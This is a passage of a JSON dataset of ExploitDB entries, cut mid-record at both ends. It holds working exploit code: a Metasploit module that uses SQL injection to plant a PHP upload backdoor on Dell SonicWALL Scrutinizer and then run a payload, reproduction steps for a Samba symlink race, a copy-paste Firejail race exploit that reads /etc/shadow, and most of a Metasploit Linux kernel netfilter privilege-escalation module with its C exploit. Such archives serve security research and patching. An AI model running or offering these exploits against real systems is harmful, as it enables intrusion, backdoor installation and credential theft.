$bname, 0777);|\r\n      exec_code = %Q|exec(\"./\" . $bname);|\r\n    end\r\n\r\n    %Q|<?php\r\n    $bname = basename( $_FILES['uploadedfile']['name']);\r\n    $target_path = \"./\" . $bname;\r\n    move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path);\r\n    #{chmod_code}\r\n    #{exec_code}\r\n    ?>\r\n    |.gsub(/\\x20{4}/, ' ')\r\n  end\r\n\r\n\r\n  # Uploads the executable payload via malicious PHP backdoor.\r\n  #\r\n  # @param backdoor_fname [String] Name of the backdoor\r\n  # @param payload_fname [String] Name of the executable payload\r\n  # @return [void]\r\n  def upload_payload(backdoor_fname, payload_fname)\r\n    p = generate_payload_exe(\r\n      code: payload.encoded,\r\n      platform: @my_target.platform,\r\n      arch: @my_target.arch\r\n    )\r\n\r\n    print_status(\"Uploading #{payload_fname} (#{p.length} bytes)...\")\r\n\r\n    post_data = Rex::MIME::Message.new\r\n    post_data.add_part(\r\n      p,\r\n      'application/octet-stream',\r\n      'binary',\r\n      \"form-data; name=\\\"uploadedfile\\\"; filename=\\\"#{payload_fname}\\\"\"\r\n    )\r\n    data = post_data.to_s\r\n\r\n    res = send_request_cgi({\r\n      'method' => 'POST',\r\n      'uri'    => normalize_uri(target_uri, \"/d4d/#{backdoor_fname}\"),\r\n      'ctype'  => \"multipart/form-data; boundary=#{post_data.bound}\",\r\n      'data'   => data\r\n    })\r\n\r\n    unless res\r\n      # Here we are not using fail_with, because when we get a session, it seems to be creating\r\n      # the same effect as connection hanging... and then eventually times out. If that\r\n      # happens, a fail_with() can cause msfconsole to believe there is no session created.\r\n      vprint_status('Connection timed out while uploading payload.')\r\n      return\r\n    end\r\n\r\n    if res.code == 404\r\n      fail_with(Failure::Unknown, \"Server returned 404 for #{backdoor_fname}.\")\r\n    end\r\n  end\r\n\r\n\r\n  # Uploads the PHP backdoor onto the target machine. The reason of using a PHP backdoor to upload\r\n  # is because our SQL injection is in a GET method, and Apache has a max length of 8190 bytes,\r\n  # which is bad for some built-in or custom payloads.\r\n  #\r\n  # @param opts [Hash]\r\n  # @option opts [String] :d4d_path\r\n  # @option opts [String] :backdoor_fname\r\n  # @option opts [String] :payload_fname\r\n  # @option opts [String] :sid\r\n  # @option opts [String] :uid\r\n  # @option opts [String] :os\r\n  # @return [void]\r\n  def upload_php_backdoor(opts)\r\n    d4d_path       = opts[:d4d_path]\r\n    backdoor_fname = opts[:backdoor_fname]\r\n    payload_fname  = opts[:payload_fname]\r\n    sid            = opts[:sid]\r\n    uid            = opts[:uid]\r\n    os             = opts[:os]\r\n\r\n    print_status(\"Injecting a PHP upload backdoor (#{backdoor_fname})...\")\r\n    hex_backdoor = get_php_backdoor(os).unpack(\"H*\")[0]\r\n    sqli_str = \"-6045 UNION ALL SELECT 0x#{hex_backdoor},#{pad_null(19)} INTO DUMPFILE '#{d4d_path}/#{backdoor_fname}' #\"\r\n    do_sqli(sqli_str, sid, uid)\r\n  end\r\n\r\n\r\n  # Attempts a SQL injection attack against the target machine.\r\n  #\r\n  # @param os [String] OS information.\r\n  # @param sid [String] Session ID.\r\n  # @param uid [String] User ID.\r\n  # @return [void]\r\n  def do_backdoor_sqli(os, sid, uid)\r\n    backdoor_fname = \"#{Rex::Text.rand_text_alpha(6)}.php\"\r\n    payload_fname  = Rex::Text.rand_text_alpha(5)\r\n    payload_fname << '.exe' if @my_target['Platform'].match(WINDOWS)\r\n    d4d_path       = get_d4d_path(os)\r\n\r\n    register_files_for_cleanup(backdoor_fname, payload_fname)\r\n\r\n    opts = {\r\n      d4d_path: d4d_path,\r\n      backdoor_fname: backdoor_fname,\r\n      payload_fname: payload_fname,\r\n      sid: sid,\r\n      uid: uid,\r\n      os: os\r\n    }\r\n\r\n    upload_php_backdoor(opts)\r\n    upload_payload(backdoor_fname, payload_fname)\r\n  end\r\n\r\n\r\n  # Tries to set the target. If the user manually set one, then avoid automatic target.\r\n  #\r\n  # @param os [String] OS information.\r\n  # @return [void]\r\n  def try_set_target(os)\r\n    @my_target = target if target != targets[0]\r\n    case os\r\n    when WINDOWS\r\n      @my_target = targets[1]\r\n    when LINUX\r\n      @my_target = targets[2]\r\n    else\r\n      fail_with(Failure::NoTarget, 'Unsupported target')\r\n    end\r\n  end\r\n\r\n\r\n  # Exploits the target machine. To do this, first we must log into the system in order to obtain\r\n  # the user ID and session ID. After logging in, we can ask the vulnerable code to upload a\r\n  # malicious PHP backdoor, and then finally use that backdoor to upload and execute our payload.\r\n  def exploit\r\n    res = do_login\r\n    uid = res['userid']\r\n    sid = res['sessionid']\r\n    os = get_os(sid, uid)\r\n    print_status(\"Detected OS information: #{os}\")\r\n    try_set_target(os)\r\n    do_backdoor_sqli(os, sid, uid)\r\n  end\r\n\r\nend",
                "description": "Dell SonicWALL Scrutinizer 11.01 - methodDetail SQL Injection (Metasploit)",
                "author": "Metasploit",
                "_id": 39836,
                "source": "ExploitDB",
                "platform": "multiple",
                "date": "2016-05-17T00:00:00+00:00",
                "cve": [],
                "type": "remote",
                "port": 0
            },
            {
                "code": "Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=1039\r\n\r\nThe Samba server is supposed to only grant access to configured share\r\ndirectories unless \"wide links\" are enabled, in which case the server is allowed\r\nto follow symlinks. The default (since CVE-2010-0926) is that wide links are\r\ndisabled.\r\n\r\nsmbd ensures that it isn't following symlinks by calling lstat() on every\r\npath component, as can be seen in strace (in reaction to the request\r\n\"get a/b/c/d/e/f/g/h/i/j\", where /public is the root directory of the share):\r\n\r\nroot@debian:/home/user# strace -e trace=file -p18954\r\nProcess 18954 attached\r\nlstat(\"a/b/c/d/e/f/g/h/i/j\", {st_mode=S_IFREG|0644, st_size=4, ...}) = 0\r\ngetcwd(\"/public\", 4096)                 = 8\r\nlstat(\"/public/a\", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0\r\nlstat(\"/public/a/b\", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0\r\nlstat(\"/public/a/b/c\", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0\r\nlstat(\"/public/a/b/c/d\", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0\r\nlstat(\"/public/a/b/c/d/e\", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0\r\nlstat(\"/public/a/b/c/d/e/f\", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0\r\nlstat(\"/public/a/b/c/d/e/f/g\", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0\r\nlstat(\"/public/a/b/c/d/e/f/g/h\", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0\r\nlstat(\"/public/a/b/c/d/e/f/g/h/i\", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0\r\nlstat(\"/public/a/b/c/d/e/f/g/h/i/j\", {st_mode=S_IFREG|0644, st_size=4, ...}) = 0\r\nstat(\"a/b/c/d/e/f/g/h/i/j\", {st_mode=S_IFREG|0644, st_size=4, ...}) = 0\r\ngetxattr(\"a/b/c/d/e/f/g/h/i/j\", \"system.posix_acl_access\", 0x7ffc8d870c30, 132) = -1 ENODATA (No data available)\r\nstat(\"a/b/c/d/e/f/g/h/i/j\", {st_mode=S_IFREG|0644, st_size=4, ...}) = 0\r\nopen(\"a/b/c/d/e/f/g/h/i/j\", O_RDONLY)   = 35\r\n\r\n\r\nThis is racy: Any of the path components - either one of the directories or the\r\nfile at the end - could be replaced with a symlink by an attacker over a second\r\nconnection to the same share. For example, replacing a/b/c/d/e/f/g/h/i\r\nwith a symlink  to / immediately before the open() call would cause smbd to open\r\n/j.\r\n\r\nTo reproduce:\r\n\r\n - Set up a server with Samba 4.5.2. (I'm using Samba 4.5.2 from Debian\r\n   unstable. I'm running the attacks on a native machine while the server is\r\n   running in a VM on the same machine.)\r\n - On the server, create a world-readable file \"/secret\" that contains some\r\n   text. The goal of the attacker is to leak the contents of that file.\r\n - On the server, create a directory \"/public\", mode 0777.\r\n - Create a share named \"public\", accessible for guests, writable, with path\r\n   \"/public\".\r\n - As the attacker, patch a copy of the samba-4.5.2 sourcecode with the patch in\r\n   attack_commands.patch.\r\n - Build the patched copy of samba-4.5.2. The built smbclient will be used in\r\n   the following steps.\r\n - Prepare the server's directory layout remotely and start the rename side of\r\n   the race:\r\n\r\n   $ ./bin/default/source3/client/smbclient -N -U guest //192.168.56.101/public\r\n   ./bin/default/source3/client/smbclient: Can't load /usr/local/samba/etc/smb.conf - run testparm to debug it\r\n   Domain=[WORKGROUP] OS=[Windows 6.1] Server=[Samba 4.5.2-Debian]\r\n   smb: \\> posix\r\n   Server supports CIFS extensions 1.0\r\n   Server supports CIFS capabilities locks acls pathnames posix_path_operations large_read posix_encrypt\r\n   smb: /> ls\r\n     .                                   D        0  Wed Dec 14 23:54:30 2016\r\n     ..                                  D        0  Wed Dec 14 13:02:50 2016\r\n\r\n        98853468 blocks of size 1024. 66181136 blocks available\r\n   smb: /> symlink / link\r\n   smb: /> mkdir normal\r\n   smb: /> put /tmp/empty normal/secret # empty file\r\n   putting file /tmp/empty as /normal/secret (0.0 kb/s) (average 0.0 kb/s)\r\n   smb: /> rename_loop link normal foobar\r\n\r\n - Over a second connection, launch the read side of the race:\r\n\r\n   $ ./bin/default/source3/client/smbclient -N -U guest //192.168.56.101/public\r\n   ./bin/default/source3/client/smbclient: Can't load /usr/local/samba/etc/smb.conf - run testparm to debug it\r\n   Domain=[WORKGROUP] OS=[Windows 6.1] Server=[Samba 4.5.2-Debian]\r\n   smb: \\> posix\r\n   Server supports CIFS extensions 1.0\r\n   Server supports CIFS capabilities locks acls pathnames posix_path_operations large_read posix_encrypt\r\n   smb: /> dump foobar/secret\r\n\r\n - At this point, the race can theoretically be hit. However, because the\r\n   renaming client performs operations synchronously, the network latency makes\r\n   it hard to win the race. (It shouldn't be too hard to adapt the SMB client to\r\n   be asynchronous, which would make the attack much more practical.) To make it\r\n   easier to hit the race, log in to the server as root and run \"strace\" against\r\n   the process that is trying to access foobar/secret all the time without any\r\n   filtering (\"strace -p19624\"). On my machine, this causes the race to be hit\r\n   every few seconds, and the smbclient that is running the \"dump\" command\r\n   prints the contents of the file each time the race is won.\r\n\r\n\r\nProof of Concept:\r\nhttps://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/41740.zip",
                "description": "Samba 4.5.2 - Symlink Race Permits Opening Files Outside Share Directory",
                "author": "Google Security Research",
                "_id": 41740,
                "source": "ExploitDB",
                "platform": "multiple",
                "date": "2017-03-27T00:00:00+00:00",
                "cve": [
                    "CVE-2010-0926"
                ],
                "type": "remote",
                "port": 0
            },
            {
                "code": "# firejail advisory for TOCTOU in --get and --put (local root)\r\n\r\nReleasing a brief advisory/writeup about a local root privesc found in firejail that we reported back in Nov, 2016. This is in response to a recent [thread](http://seclists.org/oss-sec/2017/q1/20) on oss-sec where people seem interested in details of firejail security issues. This particular vulnerability was fixed in commit [e152e2d](https://github.com/netblue30/firejail/commit/e152e2d067e17be33c7e82ce438c8ae740af6a66) but no CVE was assigned.\r\n\r\n## Vulnerability\r\n\r\nThis is a TOCTOU (race condition) bug when testing access permissions with access() and then calling copy_file(). At the time of discovery, it was clear the code suffered from many insecure coding constructs like this and much more -- but there was no guideline around making security related bug reports (other than using the public issue tracker).\r\n\r\n### Code: src/firejail/ls.c\r\n~~~~\r\nvoid sandboxfs(int op, pid_t pid, const char *path) {\r\n        EUID_ASSERT();\r\n\r\n        // if the pid is that of a firejail  process, use the pid of the first child process\r\n        EUID_ROOT();\r\n        char *comm = pid_proc_comm(pid);\r\n        EUID_USER();\r\n        if (comm) {\r\n                if (strcmp(comm, \"firejail\") == 0) {\r\n                        pid_t child;\r\n                        if (find_child(pid, &child) == 0) {\r\n                                pid = child;\r\n                        }\r\n                }\r\n                free(comm);\r\n        }\r\n\r\n        // check privileges for non-root users\r\n        uid_t uid = getuid();\r\n        if (uid != 0) {\r\n                uid_t sandbox_uid = pid_get_uid(pid);\r\n                if (uid != sandbox_uid) {\r\n                        fprintf(stderr, \"Error: permission denied.\\n\");\r\n                        exit(1);\r\n                }\r\n        }\r\n\r\n        // full path or file in current directory?\r\n        char *fname;\r\n        if (*path == '/') {\r\n                fname = strdup(path);\r\n                if (!fname)\r\n                        errExit(\"strdup\");\r\n        }\r\n        else if (*path == '~') {\r\n                if (asprintf(&fname, \"%s%s\", cfg.homedir, path + 1) == -1)\r\n                        errExit(\"asprintf\");\r\n        }\r\n        else {\r\n                fprintf(stderr, \"Error: Cannot access %s\\n\", path);\r\n                exit(1);\r\n        }\r\n\r\n        // sandbox root directory\r\n        char *rootdir;\r\n        if (asprintf(&rootdir, \"/proc/%d/root\", pid) == -1)\r\n                errExit(\"asprintf\");\r\n\r\n        if (op == SANDBOX_FS_LS) {\r\n                EUID_ROOT();\r\n                // chroot\r\n                if (chroot(rootdir) < 0)\r\n                        errExit(\"chroot\");\r\n                if (chdir(\"/\") < 0)\r\n                        errExit(\"chdir\");\r\n\r\n                // access chek is performed with the real UID\r\n                if (access(fname, R_OK) == -1) {\r\n                        fprintf(stderr, \"Error: Cannot access %s\\n\", fname);\r\n                        exit(1);\r\n                }\r\n\r\n                // list directory contents\r\n                struct stat s;\r\n                if (stat(fname, &s) == -1) {\r\n                        fprintf(stderr, \"Error: Cannot access %s\\n\", fname);\r\n                        exit(1);\r\n                }\r\n                if (S_ISDIR(s.st_mode)) {\r\n                        char *rp = realpath(fname, NULL);\r\n                        if (!rp) {\r\n                                fprintf(stderr, \"Error: Cannot access %s\\n\", fname);\r\n                                exit(1);\r\n                        }\r\n                        if (arg_debug)\r\n                                printf(\"realpath %s\\n\", rp);\r\n\r\n                        char *dir;\r\n                        if (asprintf(&dir, \"%s/\", rp) == -1)\r\n                                errExit(\"asprintf\");\r\n\r\n                        print_directory(dir);\r\n                        free(rp);\r\n                        free(dir);\r\n                }\r\n                else {\r\n                        char *rp = realpath(fname, NULL);\r\n                        if (!rp) {\r\n                                fprintf(stderr, \"Error: Cannot access %s\\n\", fname);\r\n                                exit(1);\r\n                        }\r\n                        if (arg_debug)\r\n                                printf(\"realpath %s\\n\", rp);\r\n                        char *split = strrchr(rp, '/');\r\n                        if (split) {\r\n                                *split = '\\0';\r\n                                char *rp2 = split + 1;\r\n                                if (arg_debug)\r\n                                        printf(\"path %s, file %s\\n\", rp, rp2);\r\n                                print_file_or_dir(rp, rp2, 1);\r\n                        }\r\n                        free(rp);\r\n                }\r\n        }\r\n\r\n        // get file from sandbox and store it in the current directory\r\n        else if (op == SANDBOX_FS_GET) {\r\n                // check source file (sandbox)\r\n                char *src_fname;\r\n                if (asprintf(&src_fname, \"%s%s\", rootdir, fname) == -1)\r\n                        errExit(\"asprintf\");\r\n                EUID_ROOT();\r\n                struct stat s;\r\n                if (stat(src_fname, &s) == -1) {\r\n                        fprintf(stderr, \"Error: Cannot access %s\\n\", fname);\r\n                        exit(1);\r\n                }\r\n\r\n\r\n                // try to open the source file - we need to chroot\r\n                pid_t child = fork();\r\n                if (child < 0)\r\n                        errExit(\"fork\");\r\n                if (child == 0) {\r\n                        // chroot\r\n                        if (chroot(rootdir) < 0)\r\n                                errExit(\"chroot\");\r\n                        if (chdir(\"/\") < 0)\r\n                                errExit(\"chdir\");\r\n\r\n                        // drop privileges\r\n                        drop_privs(0);\r\n\r\n                        // try to read the file\r\n                        if (access(fname, R_OK) == -1) {\r\n                                fprintf(stderr, \"Error: Cannot read %s\\n\", fname);\r\n                                exit(1);\r\n                        }\r\n                        exit(0);\r\n                }\r\n\r\n                // wait for the child to finish\r\n                int status = 0;\r\n                waitpid(child, &status, 0);\r\n                if (WIFEXITED(status) && WEXITSTATUS(status) == 0);\r\n                else\r\n                        exit(1);\r\n                EUID_USER();\r\n\r\n                // check destination file (host)\r\n                char *dest_fname = strrchr(fname, '/');\r\n                if (!dest_fname || *(++dest_fname) == '\\0') {\r\n                        fprintf(stderr, \"Error: invalid file name %s\\n\", fname);\r\n                        exit(1);\r\n                }\r\n\r\n                if (access(dest_fname, F_OK) == -1) {\r\n                        // try to create the file\r\n                        FILE *fp = fopen(dest_fname, \"w\");\r\n                        if (!fp) {\r\n                                fprintf(stderr, \"Error: cannot create %s\\n\", dest_fname);\r\n                                exit(1);\r\n                        }\r\n                        fclose(fp);\r\n                }\r\n                else {\r\n                        if (access(dest_fname, W_OK) == -1) {\r\n                                fprintf(stderr, \"Error: cannot write %s\\n\", dest_fname);\r\n                                exit(1);\r\n                        }\r\n                }\r\n                // copy file\r\n                EUID_ROOT();\r\n                copy_file(src_fname, dest_fname, getuid(), getgid(), 0644);\r\n                printf(\"Transfer complete\\n\");\r\n                EUID_USER();\r\n        }\r\n\r\n        free(fname);\r\n        free(rootdir);\r\n\r\n        exit(0);\r\n}\r\n~~~~\r\n\r\n\r\n\r\n### Code: src/firejail/util.c\r\n~~~~\r\nint copy_file(const char *srcname, const char *destname, uid_t uid, gid_t gid, mode_t mode) {\r\n        assert(srcname);\r\n        assert(destname);\r\n\r\n        // open source\r\n        int src = open(srcname, O_RDONLY);\r\n        if (src < 0) {\r\n                fprintf(stderr, \"Warning: cannot open %s, file not copied\\n\", srcname);\r\n                return -1;\r\n        }\r\n\r\n        // open destination\r\n        int dst = open(destname, O_CREAT|O_WRONLY|O_TRUNC, S_IRUSR | S_IWUSR | S_IRGRP | S_IROTH);\r\n        if (dst < 0) {\r\n                fprintf(stderr, \"Warning: cannot open %s, file not copied\\n\", destname);\r\n                close(src);\r\n                return -1;\r\n        }\r\n\r\n        // copy\r\n        ssize_t len;\r\n        static const int BUFLEN = 1024;\r\n        unsigned char buf[BUFLEN];\r\n        while ((len = read(src, buf, BUFLEN)) > 0) {\r\n                int done = 0;\r\n                while (done != len) {\r\n                        int rv = write(dst, buf + done, len - done);\r\n                        if (rv == -1) {\r\n                                close(src);\r\n                                close(dst);\r\n                                return -1;\r\n                        }\r\n\r\n                        done += rv;\r\n                }\r\n        }\r\n\r\n        if (fchown(dst, uid, gid) == -1)\r\n                errExit(\"fchown\");\r\n        if (fchmod(dst, mode) == -1)\r\n                errExit(\"fchmod\");\r\n\r\n        close(src);\r\n        close(dst);\r\n        return 0;\r\n}\r\n</snip>\r\n~~~~\r\n\r\n## Testing \r\n\r\n### Our Dockerfile\r\n\r\n~~~~\r\nFROM ubuntu:latest\r\n\r\nENV wdir /root/firejail\r\n\r\nRUN apt-get update && apt-get install -y git gcc make\r\nRUN useradd -ms /bin/bash daniel && echo \"daniel:password\" | chpasswd\r\nRUN git clone https://github.com/netblue30/firejail.git ${wdir}\r\nWORKDIR ${wdir}\r\nRUN git reset --hard 81467143ee9c47d9c90e97fb55baf2d47702d372\r\nRUN ./configure && make && make install\r\n~~~~\r\n\r\n### Our exploit\r\n\r\nThis will exploit the --get command to read /etc/shadow and print back to the console. Just copy and paste into your shell:\r\n\r\n~~~~\r\n#dropper\r\ncat > gexp.sh <<GUEST_JAIL_SCRIPT_EOF\r\nmkdir -p /tmp/exploit\r\ncat > /tmp/exploit/gaolbreak.c <<TOCTOU_POC_END\r\n#include <stdio.h>\r\n#include <stdlib.h>\r\n#include <string.h>\r\n#include <unistd.h>\r\n#include <fcntl.h>\r\n\r\nint main(int argc, char **argv)\r\n{\r\n    char *fl = \"/etc/shadow\";\r\n\r\n    if(argc > 1) {\r\n        fl = argv[1];\r\n    }\r\n\r\n    while(1) {\r\n        int fd = open(\"owned\", O_CREAT | O_RDWR, 0777);\r\n        if(fd == -1) {\r\n            perror(\"open\");\r\n            exit(1);\r\n        }\r\n        close(fd);\r\n        remove(\"owned\");\r\n        symlink(fl, \"owned\");\r\n        remove(\"owned\");\r\n    }\r\n}\r\nTOCTOU_POC_END\r\ncd /tmp/exploit\r\ngcc ./gaolbreak.c -o gaolbreak\r\n# XXX: change argv[1] to whatever you want\r\n./gaolbreak /etc/shadow\r\nGUEST_JAIL_SCRIPT_EOF\r\n\r\n# run the dropper (symlink attack) in a jail\r\nchmod +x ./gexp.sh\r\nfirejail --noprofile --force --name=el ./gexp.sh &\r\n\r\n# win race using the vulnerable 'firejail --get' command.\r\nmkdir exploitel\r\ncd exploitel\r\nwhile [ 1 ] ; do nice -n 19 firejail --get=$(pgrep -f '^firejail.*--name=el' -n) /tmp/exploit/owned >/dev/null 2>&1; cat owned 2>/dev/null; done\r\n~~~~",
                "description": "Firejail - Local Privilege Escalation",
                "author": "Daniel Hodson",
                "_id": 41022,
                "source": "ExploitDB",
                "platform": "linux",
                "date": "2017-01-09T00:00:00+00:00",
                "cve": [],
                "type": "local",
                "port": 0
            },
            {
                "code": "##\r\n# This module requires Metasploit: http://metasploit.com/download\r\n# Current source: https://github.com/rapid7/metasploit-framework\r\n##\r\n\r\nrequire \"msf/core\"\r\n\r\nclass MetasploitModule < Msf::Exploit::Local\r\n  Rank = GoodRanking\r\n\r\n  include Msf::Post::File\r\n  include Msf::Exploit::EXE\r\n  include Msf::Exploit::FileDropper\r\n\r\n  def initialize(info = {})\r\n    super(update_info(info,\r\n        'Name'           => 'Linux Kernel 4.6.3 Netfilter Privilege Escalation',\r\n        'Description'    => %q{\r\n          This module attempts to exploit a netfilter bug on Linux Kernels befoe 4.6.3, and currently\r\n          only works against Ubuntu 16.04 (not 16.04.1) with kernel\r\n          4.4.0-21-generic.\r\n          Several conditions have to be met for successful exploitation:\r\n          Ubuntu:\r\n          1. ip_tables.ko (ubuntu), iptable_raw (fedora) has to be loaded (root running iptables -L will do such)\r\n          2. libc6-dev-i386 (ubuntu), glibc-devel.i686  & libgcc.i686 (fedora) needs to be installed to compile\r\n          Kernel 4.4.0-31-generic and newer are not vulnerable.\r\n\r\n          We write the ascii files and compile on target instead of locally since metasm bombs for not\r\n          having cdefs.h (even if locally installed)\r\n        },\r\n        'License'        => MSF_LICENSE,\r\n        'Author'         =>\r\n          [\r\n            'h00die <mike@stcyrsecurity.com>',  # Module\r\n            'vnik'                         # Discovery\r\n          ],\r\n        'DisclosureDate' => 'Jun 03 2016',\r\n        'Platform'       => [ 'linux'],\r\n        'Arch'           => [ ARCH_X86 ],\r\n        'SessionTypes'   => [ 'shell', 'meterpreter' ],\r\n        'Targets'        =>\r\n          [\r\n            [ 'Ubuntu', { } ]\r\n            #[ 'Fedora', { } ]\r\n          ],\r\n        'DefaultTarget'  => 0,\r\n        'References'     =>\r\n          [\r\n            [ 'EDB', '40049'],\r\n            [ 'CVE', '2016-4997'],\r\n            [ 'URL', 'http://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/commit/?id=ce683e5f9d045e5d67d1312a42b359cb2ab2a13c']\r\n          ]\r\n      ))\r\n    register_options(\r\n      [\r\n        OptString.new('WritableDir', [ true, 'A directory where we can write files (must not be mounted noexec)', '/tmp' ]),\r\n        OptInt.new('MAXWAIT', [ true, 'Max seconds to wait for decrementation in seconds', 180 ]),\r\n        OptBool.new('REEXPLOIT', [ true, 'desc already ran, no need to re-run, skip to running pwn',false]),\r\n        OptEnum.new('COMPILE', [ true, 'Compile on target', 'Auto', ['Auto', 'True', 'False']])\r\n      ], self.class)\r\n  end\r\n\r\n  def check\r\n    def iptables_loaded?()\r\n      # user@ubuntu:~$ cat /proc/modules | grep ip_tables\r\n      # ip_tables 28672 1 iptable_filter, Live 0x0000000000000000\r\n      # x_tables 36864 2 iptable_filter,ip_tables, Live 0x0000000000000000\r\n      vprint_status('Checking if ip_tables is loaded in kernel')\r\n      if target.name == \"Ubuntu\"\r\n        iptables = cmd_exec('cat /proc/modules | grep ip_tables')\r\n        if iptables.include?('ip_tables')\r\n          vprint_good('ip_tables.ko is loaded')\r\n        else\r\n          print_error('ip_tables.ko is not loaded.  root needs to run iptables -L or similar command')\r\n        end\r\n        return iptables.include?('ip_tables')\r\n      elsif target.name == \"Fedora\"\r\n        iptables = cmd_exec('cat /proc/modules | grep iptable_raw')\r\n        if iptables.include?('iptable_raw')\r\n          vprint_good('iptable_raw is loaded')\r\n        else\r\n          print_error('iptable_raw is not loaded.  root needs to run iptables -L or similar command')\r\n        end\r\n        return iptables.include?('iptable_raw')\r\n      else\r\n        return false\r\n      end\r\n    end\r\n\r\n    def shemsham_installed?()\r\n      # we want this to be false.\r\n      vprint_status('Checking if shem or sham are installed')\r\n      shemsham = cmd_exec('cat /proc/cpuinfo')\r\n      if shemsham.include?('shem')\r\n        print_error('shem installed, system not vulnerable.')\r\n      elsif shemsham.include?('sham')\r\n        print_error('sham installed, system not vulnerable.')\r\n      else\r\n        vprint_good('shem and sham not present.')\r\n      end\r\n      return (shemsham.include?('shem') or shemsham.include?('sham'))\r\n    end\r\n\r\n    if iptables_loaded?() and not shemsham_installed?()\r\n      return CheckCode::Appears\r\n    else\r\n      return CheckCode::Safe\r\n    end\r\n  end\r\n\r\n  def exploit\r\n    # first thing we need to do is determine our method of exploitation: compiling realtime, or droping a pre-compiled version.\r\n    def has_prereqs?()\r\n      vprint_status('Checking if 32bit C libraries, gcc-multilib, and gcc are installed')\r\n      if target.name == \"Ubuntu\"\r\n        lib = cmd_exec('dpkg --get-selections | grep libc6-dev-i386')\r\n        if lib.include?('install')\r\n          vprint_good('libc6-dev-i386 is installed')\r\n        else\r\n          print_error('libc6-dev-i386 is not installed.  Compiling will fail.')\r\n        end\r\n        multilib = cmd_exec('dpkg --get-selections | grep ^gcc-multilib')\r\n        if multilib.include?('install')\r\n          vprint_good('gcc-multilib is installed')\r\n        else\r\n          print_error('gcc-multilib is not installed.  Compiling will fail.')\r\n        end\r\n        gcc = cmd_exec('which gcc')\r\n        if gcc.include?('gcc')\r\n          vprint_good('gcc is installed')\r\n        else\r\n          print_error('gcc is not installed.  Compiling will fail.')\r\n        end\r\n        return gcc.include?('gcc') && lib.include?('install') && multilib.include?('install')\r\n      elsif target.name == \"Fedora\"\r\n        lib = cmd_exec('dnf list installed | grep -E \\'(glibc-devel.i686|libgcc.i686)\\'')\r\n        if lib.include?('glibc')\r\n          vprint_good('glibc-devel.i686 is installed')\r\n        else\r\n          print_error('glibc-devel.i686 is not installed.  Compiling will fail.')\r\n        end\r\n        if lib.include?('libgcc')\r\n          vprint_good('libgcc.i686 is installed')\r\n        else\r\n          print_error('libgcc.i686 is not installed.  Compiling will fail.')\r\n        end\r\n        multilib = false #not implemented\r\n        gcc = false #not implemented\r\n        return (lib.include?('glibc') && lib.include?('libgcc')) && gcc && multilib\r\n      else\r\n        return false\r\n      end\r\n    end\r\n\r\n    compile = false\r\n    if datastore['COMPILE'] == 'Auto' || datastore['COMPILE'] == 'True'\r\n      if has_prereqs?()\r\n        compile = true\r\n        vprint_status('Live compiling exploit on system')\r\n      else\r\n        vprint_status('Dropping pre-compiled exploit on system')\r\n      end\r\n    end\r\n    if check != CheckCode::Appears\r\n      fail_with(Failure::NotVulnerable, 'Target not vulnerable! punt!')\r\n    end\r\n\r\n    desc_file = datastore[\"WritableDir\"] + \"/\" + rand_text_alphanumeric(8)\r\n    env_ready_file = datastore[\"WritableDir\"] + \"/\" + rand_text_alphanumeric(8)\r\n    pwn_file = datastore[\"WritableDir\"] + \"/\" + rand_text_alphanumeric(8)\r\n    payload_file = rand_text_alpha(8)\r\n    payload_path = \"#{datastore[\"WritableDir\"]}/#{payload_file}\"\r\n\r\n    # direct copy of code from exploit-db, except removed the check for shem/sham and ip_tables.ko since we can do that in the check area here\r\n    # removed         #include <netinet/in.h> per busterb comment in PR 7326\r\n    decr = %q{\r\n      #define _GNU_SOURCE\r\n      #include <stdio.h>\r\n      #include <stdlib.h>\r\n      #include <string.h>\r\n      #include <unistd.h>\r\n      #include <sched.h>\r\n      #include <netinet/in.h>\r\n      #include <linux/sched.h>\r\n      #include <errno.h>\r\n      #include <sys/types.h>\r\n      #include <sys/socket.h>\r\n      #include <sys/ptrace.h>\r\n      #include <net/if.h>\r\n      #include <linux/netfilter_ipv4/ip_tables.h>\r\n      #include <linux/netlink.h>\r\n      #include <fcntl.h>\r\n      #include <sys/mman.h>\r\n\r\n      #define MALLOC_SIZE 66*1024\r\n\r\n      int decr(void *p) {\r\n          int sock, optlen;\r\n          int ret;\r\n          void *data;\r\n          struct ipt_replace *repl;\r\n          struct ipt_entry *entry;\r\n          struct xt_entry_match *ematch;\r\n          struct xt_standard_target *target;\r\n          unsigned i;\r\n\r\n          sock = socket(PF_INET, SOCK_RAW, IPPROTO_RAW);\r\n\r\n          if (sock == -1) {\r\n                  perror(\"socket\");\r\n                  return -1;\r\n          }\r\n\r\n          data = malloc(MALLOC_SIZE);\r\n\r\n          if (data == NULL) {\r\n              perror(\"malloc\");\r\n              return -1;\r\n          }\r\n\r\n          memset(data, 0, MALLOC_SIZE);\r\n\r\n          repl = (struct ipt_replace *) data;\r\n          repl->num_entries = 1;\r\n          repl->num_counters = 1;\r\n          repl->size = sizeof(*repl) + sizeof(*target) + 0xffff;\r\n          repl->valid_hooks = 0;\r\n\r\n          entry = (struct ipt_entry *) (data + sizeof(struct ipt_replace));\r\n          entry->target_offset = 74; // overwrite target_offset\r\n          entry->next_offset = sizeof(*entry) + sizeof(*ematch) + sizeof(*target);\r\n\r\n          ematch = (struct xt_entry_match *) (data + sizeof(struct ipt_replace) + sizeof(*entry));\r\n\r\n          strcpy(ematch->u.user.name, \"icmp\");\r\n          void *kmatch = (void*)mmap((void *)0x10000, 0x1000, 7, 0x32, 0, 0);\r\n          uint64_t *me = (uint64_t *)(kmatch + 0x58);\r\n          *me = 0xffffffff821de10d; // magic number!\r\n\r\n          uint32_t *match = (uint32_t *)((char *)&ematch->u.kernel.match + 4);\r\n          *match = (uint32_t)kmatch;\r\n\r\n          ematch->u.match_size = (short)0xffff;\r\n\r\n          target = (struct xt_standard_target *)(data + sizeof(struct ipt_replace) + 0xffff + 0x8);\r\n          uint32_t *t = 